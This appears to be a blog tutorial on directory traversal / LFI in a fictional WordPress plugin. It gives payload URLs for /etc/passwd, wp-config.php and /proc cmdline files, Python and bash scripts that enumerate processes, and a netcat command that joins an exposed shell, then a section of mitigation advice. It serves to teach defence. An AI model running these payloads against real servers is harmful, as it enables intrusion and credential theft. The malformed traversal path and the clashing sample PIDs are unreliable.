---
title: "Exploring WordPress Plugin Vulnerabilities: Directory Traversal & PID"
date: 2022-08-17 18:18:30
categories: [wordpress]
tags: [vulnerabilities, wordpress, exploit]
---

In the vast ecosystem of WordPress, plugins add incredible functionality to websites but can also open the door to significant vulnerabilities. A concerning example is the Directory Traversal issue, which can allow an attacker to access sensitive files on the server. Today, we'll dissect this type of vulnerability using a fictional plugin, highlighting how to exploit it and the associated security implications.

## What is Directory Traversal?

Directory Traversal, also known as path traversal, involves attacks aimed at exploiting flaws in systems that allow attackers to access directories and files stored outside of the web server's root directory. This vulnerability can be particularly damaging if the web server is poorly configured or if the plugin does not adequately validate user inputs.

## Practical Example in a WordPress Plugin

Consider a WordPress plugin named "vulnerable-LFI-plugin". This plugin has a file, `file.php`, used to load images or other files specified in the URL. An example URL would be:

```
wp-content/plugins/vulnerable-LFI-plugin/file.php?url=photo.jpg
```

In this scenario, an attacker could modify the URL to request sensitive system files. For instance, by changing `photo.jpg` to `/etc/passwd`, the modified URL would be:

```
http://host-vuln/wp-content/plugins/vulnerable-LFI-plugin/file.php?url=/etc/passwd
```

Accessing this URL could potentially return the contents of the `passwd` file, which contains the user list of the operating system. This is a classic example of a Local File Inclusion (LFI) attack exploiting the Directory Traversal flaw.

## Escalating the Attack

The exposure of the `passwd` file might just be the beginning. An attacker could use this technique to locate and access the WordPress configuration file, `wp-config.php`, which contains sensitive database connection information. The exploitation URL could use a relative directory sequence like:

```
http://host-vuln/wp-content/plugins/vulnerable-LFI-plugin/file.php?url=../../..wp-config.php
```


# Deepening Exploitation with PID Enumeration via Local File Inclusion (LFI)

In addition to directly accessing critical system files, a Directory Traversal vulnerability can be utilized to enumerate active processes on the server via Process IDs (PIDs). This technique exploits the `/proc` directory, which is a special filesystem in Linux primarily used to access kernel information about processes.

## How Does PID Enumeration Work?

Using the LFI vulnerability, we can access the `cmdline` file located in `/proc/{PID}/cmdline`, which contains the command line used to start the process. This can reveal valuable information about the services running on the system and potentially entry points for deeper exploitations.

**Practical Example:**

Suppose we have a vulnerable server and want to check the commands each process is running. We can do this manually with the `ps` command to see the active processes:

```bash
ps
PID TTY  TIME CMD
402 pts/5 00:00:00 zsh
601 pts/5 00:00:00 nc
622 pts/5 00:00:00 ps
```

To investigate the process with PID 402, we would:

```bash
cat /proc/402/cmdline
```

The output would be something like `/proc/402/cmdline <BINARY>`, showing the command line that initiated the `zsh`.


So, if we input the payload `/proc/1/cmdline` (`http://host-vuln/wp-content/plugins/vulnerable-LFI-plugin/file.php?url=/proc/1/cmdline`) and receive an output like`/proc/1/cmdline/proc/1/cmdline/proc/1/cmdline/sbin/initautomatic-ubiqutynoprompt<script>window.close()</script>`, we can create a fuzzing script.

## Script for Automating the Exploitation

For more effective exploration, we can automate this process with a Python script. The following script attempts to read the `cmdline` of each process up to PID 1000:

```python
import requests

for i in range(1, 1000):
    r = requests.get(f"http://host-vuln/wp-content/plugins/vulnerable-LFI-plugin/file.php?url=/proc/{i}/cmdline")
    out = r.text.replace(f'/proc/{i}/cmdline', '').replace('<script>window.close()</script>', '').replace('\00', ' ')
    if len(out) > 1:
        print(f"PID {i} : {out}")
```

**Example Output:**

```plaintext
PID 1 : /sbin/init auto automatic-ubiquity noprompt
PID 620 : /bin/sh -c "nc -nvpl 1337"
PID 850 : /usr/sbin/atd -f
```

In PID 620, we discovered a `netcat` process listening on port 1337, indicating a potential backdoor or a configured reverse shell on the server.

## Scanning and Connecting with Netcat

If we already know that port 1337 might be open, we can confirm using a Bash script that finds the correct PID that is listening on this port:

```bash
i=0
while [[ $(curl -s "http://host-vuln/wp-content/plugins/vulnerable-LFI-plugin/file.php?url=/proc/$i/cmdline") != *"1337"* ]]; do
    ((i=i+1))
done
echo $i
```

Output:
```
620
```
By identifying the correct PID, we can directly access the `cmdline` of the process to get details about the command executed:

```bash
# URL Example to Access
http://host-vuln/wp-content/plugins/vulnerable-LFI-plugin/file.php?url=/proc/620/cmdline
```

Output:
```
 /cmdline/bin/sh/su user -c "cd /home/user;nc -nvpl 1337"; done <script>window.close()</script>
```

If confirmed, we could then attempt a connection via `netcat` to establish an interactive session with the system's shell, taking control over the server.

```bash
nc host-vuln 1337
```

# Mitigating Directory Traversal and PID Vulnerabilities in WordPress Plugins

In the landscape of web security, vulnerabilities such as Directory Traversal and PID (Process ID) disclosure pose significant threats, especially in widely-used platforms like WordPress. These vulnerabilities can allow attackers to gain unauthorized access to system files and manipulate processes running on the server. This article discusses practical steps to mitigate these vulnerabilities in WordPress plugins.

## Understanding the Vulnerabilities

Directory Traversal attacks exploit poor input validation to access files and directories stored outside the web root folder. An attacker can manipulate variables that reference files with "dot-dot-slash (../)" sequences or similar methods to traverse to areas storing sensitive information.

PID disclosure vulnerabilities occur when system process information is inadvertently exposed to an attacker, typically through an improperly secured file inclusion. This can reveal running processes, their states, and system configuration details which can be used to tailor further attacks.

## Mitigation Strategies

**1. Input Validation:**  
Enhance input validation mechanisms to ensure that all user inputs are sanitized and filtered against potentially harmful content. Restrict file paths to a predefined whitelist of safe paths and explicitly block requests containing traversal sequences or unusual characters.

**2. Principle of Least Privilege:**  
Operate web services with the least privileges necessary. Most web applications do not require access to system files or critical internal data. Configuring file permissions and access controls rigorously can prevent unauthorized file access, even if a vulnerability is exploited.

**3. Use of Security Plugins:**  
Utilize security plugins that specifically provide hardening features for WordPress. Plugins such as Wordfence, iThemes Security, and Sucuri Security can help detect and block many types of attacks, including file inclusion and directory traversal.

**4. Regular Updates and Patch Management:**  
Keep WordPress, its plugins, and themes updated. Developers often release security patches that fix vulnerabilities. Regular updates are crucial in closing the security gaps that attackers exploit.

**5. Logging and Monitoring:**  
Implement comprehensive logging and monitoring to detect unusual access patterns or file modifications. Tools like OSSEC for intrusion detection can be configured to alert administrators about such activities, facilitating rapid response to potential breaches.

**6. Security Headers and Configurations:**  
Employ security headers such as `X-Frame-Options`, `X-XSS-Protection`, and `Content-Security-Policy` to enhance the security of browser interactions with your site. Additionally, configuring `php.ini` settings to disable functions like `shell_exec` and `exec` can limit the damage that can be done if an attacker gains some level of script execution ability.

**7. Disable Directory Listings:**  
Ensure that directory listings are disabled on the server. This prevents attackers from easily discovering and navigating through your directory structure.

**8. Code Audits and Reviews:**  
Regularly audit and review code, especially for custom plugins or themes. This can often catch potential security issues before they become exploitable in a live environment.

## Conclusion

Mitigating the risk of Directory Traversal and PID vulnerabilities in WordPress requires a multi-faceted approach involving strict configuration, proactive security practices, and regular monitoring. By implementing the above strategies, administrators can significantly reduce the attack surface of their WordPress installations and protect their digital assets against common and potentially devastating attacks.
